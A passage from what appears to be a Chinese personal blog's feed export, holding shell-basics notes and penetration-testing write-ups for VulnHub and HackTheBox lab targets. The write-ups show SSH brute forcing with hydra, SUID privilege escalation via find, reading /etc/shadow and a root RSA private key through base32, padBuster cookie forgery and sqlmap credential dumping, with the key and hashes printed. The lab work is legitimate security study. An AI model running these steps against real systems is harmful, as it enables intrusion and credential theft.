class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell 格式化输出</title>
      <link href="/2020/06/19/shell-ge-shi-hua-shu-chu/"/>
      <url>/2020/06/19/shell-ge-shi-hua-shu-chu/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  echo 一个神奇的东西</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell"># 参数 # -n   输出后不换行# -e   可以解释转移字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell"><code class="language-shell">#/bin/bash#模拟登陆echo -n Login:read userecho -n Password:read passecho username:$user password:$pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20200619081406403.png" alt></p><pre class="line-numbers language-shell"><code class="language-shell">#/bin/bash#倒计时计数器 不好截图就不截了 hhhfor i in $(seq 1 10);doecho -n `expr 10 - $i`;sleep 1echo -ne '\b';doneecho <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出颜色……先不管，感觉用不着~</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tre</title>
      <link href="/2020/06/17/tre/"/>
      <url>/2020/06/17/tre/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  nmap </p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ nmap -p1-65535 -sV 192.168.232.156Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 05:16 EDTNmap scan report for bogon (192.168.232.156)Host is up (0.00042s latency).Not shown: 65532 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)80/tcp   open  http    Apache httpd 2.4.38 ((Debian))8082/tcp open  http    nginx 1.14.2Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 10.73 secondskali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>80 和 8082 两个端口呈现一样的内容</p><p><img src="image-20200617171807595.png" alt></p><blockquote><p>  dirb 所扫描目录</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">dirb http://192.168.232.156/ /usr/share/dirb/wordlists/big.txt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20200617172515530.png" alt></p><p><img src="image-20200617172609404.png" alt></p><p><img src="image-20200617172628731.png" alt></p><p>在扫一下网站找找登陆页面</p><p><img src="image-20200617172936104.png" alt></p><p>访问并登陆</p><p><img src="image-20200617173100239.png" alt></p><p>查看 <code>mantis_user_table</code> 表的内容</p><p><img src="image-20200617173221641.png" alt> </p><p>看着 username:realname 就像是 user:passwd</p><p>其实我开始的思路是把 tre 用户的 password 字段换了，登陆后台，确实有个后台可以进去，但我发现不会getshell</p><p><img src="1.JPG" alt></p><p>用得到了用户名和密码登陆 ssh</p><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ ssh tre@192.168.232.156tre@192.168.232.156's password: Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Wed Jun 17 05:01:38 2020 from 192.168.232.153tre@tre:~$ tre@tre:~$ sudo -lMatching Defaults entries for tre on tre:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser tre may run the following commands on tre:    (ALL) NOPASSWD: /sbin/shutdowntre@tre:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以执行 shutdown 是不是机器重启会启动什么服务之类的，而这类服务貌似权限都挺高</p><p>传一个 pspy64 上去</p><p><img src="image-20200617173942709.png" alt></p><p> root 每秒钟都会执行一次 check-system ，加两个语句进去看会不被执行</p><p><img src="image-20200617174104097.png" alt></p><p>修改后查看 find 和 ip 的权限没有改变，想到 linux 有个特点重启生效~</p><p><img src="image-20200617174438968.png" alt></p><p>看到 find 就有 suid 权限了</p><pre class="line-numbers language-shell"><code class="language-shell">tre@tre:~$ tre@tre:~$ find . -exec /bin/bash -p \; -quitbash-5.0# bash-5.0# whoamirootbash-5.0# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Geisha</title>
      <link href="/2020/06/13/geisha/"/>
      <url>/2020/06/13/geisha/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  nmap 扫描</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo nmap -sV -sS 192.168.232.155 -p1-65535 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 01:57 EDTStats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 27.95% done; ETC: 01:57 (0:00:03 remaining)Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 71.43% done; ETC: 01:57 (0:00:04 remaining)Nmap scan report for bogon (192.168.232.155)Host is up (0.00098s latency).Not shown: 65528 closed portsPORT     STATE SERVICE  VERSION21/tcp   open  ftp      vsftpd 3.0.322/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)80/tcp   open  http     Apache httpd 2.4.38 ((Debian))7080/tcp open  ssl/http LiteSpeed httpd7125/tcp open  http     nginx 1.17.108088/tcp open  http     LiteSpeed httpd9198/tcp open  http     SimpleHTTPServer 0.6 (Python 2.7.16)MAC Address: 00:0C:29:52:CD:CD (VMware)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 21.33 secondskali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问一波web服务，发现都是一张图片，还挺好看</p><p><img src="image-20200613133133458.png" alt></p><blockquote><p>  dirb 扫描</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo dirb http://192.168.232.155:7125/-----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Sat Jun 13 02:00:37 2020URL_BASE: http://192.168.232.155:7125/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://192.168.232.155:7125/ ----+ http://192.168.232.155:7125/index.php (CODE:200|SIZE:175)                               + http://192.168.232.155:7125/passwd (CODE:200|SIZE:1432)                                 + http://192.168.232.155:7125/shadow (CODE:403|SIZE:556)                                 -----------------END_TIME: Sat Jun 13 02:00:40 2020DOWNLOADED: 4612 - FOUND: 3kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问 passwd 文件将其下载下来，shadow 由于权限不足无法访问</p><p><img src="image-20200613140259069.png" alt></p><p>有一个 geisha 用户，尝试爆破ssh</p><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo hydra -l geisha -P ./rockyou.txt -f ssh://192.168.232.155Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-13 02:04:14[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task[DATA] attacking ssh://192.168.232.155:22/[STATUS] 149.00 tries/min, 149 tries in 00:01h, 14344250 to do in 1604:31h, 16 active[STATUS] 112.00 tries/min, 336 tries in 00:03h, 14344063 to do in 2134:32h, 16 active[22][ssh] host: 192.168.232.155   login: geisha   password: letmein[STATUS] attack finished for 192.168.232.155 (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-13 02:09:01kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到密码，登陆，准别提权，放 LinEnum 去跑</p><p><img src="image-20200613141823581.png" alt></p><p>可以利用这个程序读敏感文件，用它读 shadow</p><pre class="line-numbers language-shell"><code class="language-shell">geisha@geisha:/tmp$ base32 /etc/shadow | base32 -droot:$6$p/n6gA9F6qb7..aD$d4YNXyKsg.Tam5AoDiOp0T9rWAMAkN55O9.BTyhyOacdXHgpTkpbE9nBe5R35oFzntg7prt3xfdSW9U9Ty1680:18391:0:99999:7:::……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>用 JtR 尝试破解 root 密码，解密失败</p><p>恼羞成怒，直接都 root 的 flag</p><pre class="line-numbers language-shell"><code class="language-shell">geisha@geisha:~$ base32 /root/flag.txt | base32 -dFlag{Sun_CTF_220_5_G31sha}geisha@geisha:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>冷静下来发现酱紫是不对滴~，还是拿 root 权限踏实</p><p>读取 ssh 私钥，用 root 私钥登陆靶机，得到root权限…… </p><pre class="line-numbers language-shell"><code class="language-shell">geisha@geisha:~$ base32 /root/.ssh/id_rsa | base32 -d-----BEGIN RSA PRIVATE KEY-----MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX589FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcwwWW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGRY/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYOjceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOlTHxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bubRaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHHxvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWredeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFhzh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOfv/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0MOuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCvbf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=-----END RSA PRIVATE KEY-----geisha@geisha:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拷贝下来 修改权限为 <code>600</code> 远程登陆</p><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo chmod 600 privateKey kali@kali:~$ ls -lh privateKey -rw------- 1 root root 1.7K Jun 12 22:43 privateKeykali@kali:~$ kali@kali:~$ sudo ssh -i privateKey root@192.168.232.155 Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Fri Jun 12 22:49:43 2020 from 192.168.232.153root@geisha:~# root@geisha:~# iduid=0(root) gid=0(root) groups=0(root)root@geisha:~# root@geisha:~# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拜了个拜~</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell 语法</title>
      <link href="/2020/06/11/shell-yu-fa/"/>
      <url>/2020/06/11/shell-yu-fa/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  shell 特殊符号</p></blockquote><table><thead><tr><th align="center">符号</th><th align="center">含义</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><strong>~</strong></td><td align="center">家目录</td><td align="center"></td></tr><tr><td align="center"><strong>—</strong></td><td align="center">上次使用的目录</td><td align="center"></td></tr><tr><td align="center"><strong>!</strong></td><td align="center">可用于执行历史命令</td><td align="center"></td></tr><tr><td align="center"><strong>$</strong></td><td align="center">取变量的内容</td><td align="center"><code>echo $USER</code></td></tr><tr><td align="center"><strong>&amp;</strong></td><td align="center">后台运行</td><td align="center"><code>vim test.txt &amp;</code></td></tr><tr><td align="center"><strong>*</strong></td><td align="center">匹配任意字符</td><td align="center"></td></tr><tr><td align="center"><strong>?</strong></td><td align="center">匹配一次</td><td align="center"></td></tr><tr><td align="center"><strong>`</strong></td><td align="center">命令中执行</td><td align="center"></td></tr><tr><td align="center"><strong>\’</strong></td><td align="center">不解释变量</td><td align="center"><code>echo &#39;$USER&#39;</code></td></tr><tr><td align="center"><strong>\”</strong></td><td align="center">解释变量</td><td align="center"><code>echo &quot;$USER&quot;</code></td></tr><tr><td align="center">$?</td><td align="center">取上一个命令的返回值，正确执行返回0，出错返回非0</td><td align="center"></td></tr></tbody></table><blockquote><p>  输入输出重定向</p></blockquote><table><thead><tr><th align="center">符号</th><th align="center">含义</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">&gt;</td><td align="center">输出重定向，覆盖上一次输出</td><td align="center"></td></tr><tr><td align="center">&gt;&gt;</td><td align="center">输出重定向，追加输出</td><td align="center"></td></tr><tr><td align="center">&lt;</td><td align="center">输入重定向</td><td align="center"></td></tr><tr><td align="center">&lt;&lt;</td><td align="center">输入重定向</td><td align="center"></td></tr></tbody></table><blockquote><p>  脚本退出</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">exit NUM   #NUM 取值在1-255之间<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>  数学计算</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">expr    #整数级别的运算bc      #文本计算器  echo "`echo "scale=2;100*234/345" | bc`%"   #计算cpu使用率，保留两位小数(())    #括号里的表达式会被计算<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexothebox-ctf-web</title>
      <link href="/2020/06/09/hexothebox-ctf-web/"/>
      <url>/2020/06/09/hexothebox-ctf-web/</url>
      
        <content type="html"><![CDATA[<h3 id="Fuzzy"><a href="#Fuzzy" class="headerlink" title="Fuzzy"></a>Fuzzy</h3><p><img src="image-20200609140622160.png" alt></p><p>查看源代码，基本确定这是一个和服务器没有数据交互的页面</p><blockquote><p>  目录扫描</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo dirb http://docker.hackthebox.eu:31334/-----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Tue Jun  9 02:08:18 2020URL_BASE: http://docker.hackthebox.eu:31334/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                       ---- Scanning URL: http://docker.hackthebox.eu:31334/ ----==> DIRECTORY: http://docker.hackthebox.eu:31334/api/                       ^C> Testing: http://docker.hackthebox.eu:31334/campaign                     kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>  对api目录进行扫描</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo gobuster dir -u "http://docker.hackthebox.eu:31334/api/" -w /usr/share/dirb/wordlists/common.txt -t 50 -x php,jsp,asp,aspx,html,htm===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:            http://docker.hackthebox.eu:31334/api/[+] Threads:        50[+] Wordlist:       /usr/share/dirb/wordlists/common.txt[+] Status codes:   200,204,301,302,307,401,403[+] User Agent:     gobuster/3.0.1[+] Extensions:     jsp,asp,aspx,html,htm,php[+] Timeout:        10s===============================================================2020/06/09 02:31:24 Starting gobuster===============================================================/action.php (Status: 200)Progress: 1759 / 4615 (38.11%)^C[!] Keyboard interrupt detected, terminating.===============================================================2020/06/09 02:32:31 Finished===============================================================kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20200609143415788.png" alt></p><blockquote><p>  wfuzz 爆破参数</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo wfuzz --hh=24 -w /usr/share/dirb/wordlists/big.txt -u http://docker.hackthebox.eu:31334/api/action.php?FUZZ=alingWarning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 2.4.5 - The Web Fuzzer                         *********************************************************Target: http://docker.hackthebox.eu:31334/api/action.php?FUZZ=alingTotal requests: 20469===================================================================ID           Response   Lines    Word     Chars       Payload               ===================================================================000015356:   200        0 L      5 W      27 Ch       "reset"               000017341:   200        0 L      4 W      24 Ch       "style_captcha"                                 ^CFinishing pending requests...kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20200609145502517.png" alt></p><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo wfuzz --hh=27 -w /usr/share/dirb/wordlists/big.txt -u http://docker.hackthebox.eu:31334/api/action.php?reset=FUZZWarning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 2.4.5 - The Web Fuzzer                         *********************************************************Target: http://docker.hackthebox.eu:31334/api/action.php?reset=FUZZTotal requests: 20469===================================================================ID           Response   Lines    Word     Chars       Payload               ===================================================================000000318:   200        0 L      10 W     74 Ch       "20" #####             000000529:   200        0 L      5 W      27 Ch       "366"                                           ^CFinishing pending requests...kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="Emdee-five-for-life"><a href="#Emdee-five-for-life" class="headerlink" title="Emdee five for life"></a>Emdee five for life</h3><p><img src="image-20200609141514079.png" alt></p><blockquote><p>  脚本</p></blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> resession <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://docker.hackthebox.eu:31269/'</span>header <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'</span><span class="token punctuation">,</span>    <span class="token string">'Referer'</span><span class="token punctuation">:</span><span class="token string">'http://docker.hackthebox.eu:31269/'</span><span class="token punctuation">}</span>res_get <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>context <span class="token operator">=</span> res_get<span class="token punctuation">.</span>textpattern <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">"&lt;h3 align='center'>.*&lt;/h3>"</span><span class="token punctuation">)</span>str <span class="token operator">=</span> pattern<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#print(str)</span>payload <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token string">'hash'</span><span class="token punctuation">:</span>payload<span class="token punctuation">}</span><span class="token comment" spellcheck="true">#print(data)</span><span class="token comment" spellcheck="true">#print('=' * 20)</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="I-know-Mag1k"><a href="#I-know-Mag1k" class="headerlink" title="I know Mag1k"></a>I know Mag1k</h3><p><img src="image-20200618210305026.png" alt></p><p>开始以为是注入，搞了半天没搞出来</p><p>注入一个账号，登陆进去，看见有个显示邮箱和用户名，又以为是 2 次注入，还是失败了……</p><p><img src="image-20200618210538599.png" alt></p><p>不会了，看看别人的 <a href="https://phantominfosec.wordpress.com/2018/12/23/hackthebox-web-challenge-i-know-mag1k/" target="_blank" rel="noopener">WP</a> </p><p>只能说又学到了，cookie 有个可疑字段，用 <a href="https://github.com/GDSSecurity/PadBuster" target="_blank" rel="noopener">padBuster</a> 破解该字段内容</p><p><img src="image-20200618210916624.png" alt></p><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~/Desktop$ ./padBuster.pl http://docker.hackthebox.eu:31433/profile.php rRVmlV%2FSN0c9H%2BiW8UlNBFV%2BgIQwJFV0QblY7Ayu9LykIXsQU61SWg%3D%3D 8 --cookie "iknowmag1k=cRwnyPANRd4%2BQ229dNWR%2FkYgi8y%2BUd4O%2FXBVxvL1DmjXFrgMFiZ8LQ%3D%3D" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>破解的过程会等很久</p><p><img src="image-20200618211343695.png" alt></p><p>把身份换成 admin 就可以了，同样使用 padBuster加密</p><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~/Desktop$ ./padBuster.pl http://docker.hackthebox.eu:31433/profile.php cRwnyPANRd4%2BQ229dNWR%2FkYgi8y%2BUd4O%2FXBVxvL1DmjXFrgMFiZ8LQ%3D%3D 8 --cookie "iknowmag1k=cRwnyPANRd4%2BQ229dNWR%2FkYgi8y%2BUd4O%2FXBVxvL1DmjXFrgMFiZ8LQ%3D%3D" -plaintext "{\"user\":\"aling\",\"role\":\"admin\"}"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20200618211548064.png" alt></p><p>burp 改包重放就可以了</p><p><img src="image-20200618211639335.png" alt></p><hr><h3 id="FreeLancer"><a href="#FreeLancer" class="headerlink" title="FreeLancer"></a>FreeLancer</h3><p>查看源代码</p><p><img src="image-20200621173338037.png" alt></p><p>sqlmap 跑</p><pre class="line-numbers language-shell"><code class="language-shell">D:\sqlmap>py -3 sqlmap.py -u "http://docker.hackthebox.eu:32382/portfolio.php?id=3" --batch -dbms=mysql -D freelancer -T safeadmin -dump        ___       __H__ ___ ___[(]_____ ___ ___  {1.4.5.19#dev}|_ -| . [(]     | .'| . ||___|_  [(]_|_|_|__,|  _|      |_|V...       |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 16:56:10 /2020-06-21/[16:56:10] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=3 AND 3927=3927    Type: time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)    Payload: id=3 AND (SELECT 9302 FROM (SELECT(SLEEP(5)))pAAS)    Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: id=3 UNION ALL SELECT NULL,CONCAT(0x7170767071,0x6f6c4c4366565357434f4e62476855417178575a4f4246445645576a7644564e6b53616e65736b5a,0x7171626a71),NULL-- ----[16:56:11] [INFO] testing MySQL[16:56:11] [INFO] confirming MySQL[16:56:11] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL >= 5.0.0 (MariaDB fork)[16:56:11] [INFO] fetching columns for table 'safeadmin' in database 'freelancer'[16:56:11] [INFO] fetching entries for table 'safeadmin' in database 'freelancer'Database: freelancerTable: safeadmin[1 entry]+------+----------+--------------------------------------------------------------+---------------------+| id   | username | password                                                     | created_at          |+------+----------+--------------------------------------------------------------+---------------------+| 1    | safeadm  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | 2019-07-16 20:25:45 |+------+----------+--------------------------------------------------------------+---------------------+[16:56:12] [INFO] table 'freelancer.safeadmin' dumped to CSV file 'C:\Users\ALing\AppData\Local\sqlmap\output\docker.hackthebox.eu\dump\freelancer\safeadmin.csv'[16:56:12] [INFO] fetched data logged to text files under 'C:\Users\ALing\AppData\Local\sqlmap\output\docker.hackthebox.eu'[*] ending @ 16:56:12 /2020-06-21/D:\sqlmap><span aria-hidden="true" 